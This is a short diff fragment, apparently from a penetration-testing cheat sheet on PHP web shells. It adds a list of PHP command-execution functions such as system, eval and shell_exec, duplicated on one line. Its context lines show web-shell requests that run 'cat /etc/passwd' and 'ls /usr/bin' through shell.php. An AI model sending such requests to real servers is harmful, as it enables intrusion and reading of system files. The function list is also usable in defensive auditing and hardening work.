@@ -30,3 +30,8 @@ shell.php?cmd=cat+/etc/passwd
 
 shell.php?cmd=ls+/usr/bin
 
+PHP FUNCTION
+============
+
+system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec	system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec
+
